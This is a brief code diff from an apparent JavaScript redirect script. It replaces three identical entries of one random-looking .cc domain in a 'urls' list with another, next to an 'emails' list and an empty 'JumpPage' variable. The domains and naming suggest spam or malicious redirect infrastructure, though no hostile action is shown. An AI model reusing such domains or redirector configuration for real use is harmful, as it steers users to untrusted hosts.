@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
-	'ysyiltesr.cc/', 
-	'ysyiltesr.cc/', 
-    'ysyiltesr.cc/',
+	'agdkczeyx.cc/', 
+	'agdkczeyx.cc/', 
+    'agdkczeyx.cc/',
 ];                                                                                                                  
 
 var JumpPage="";
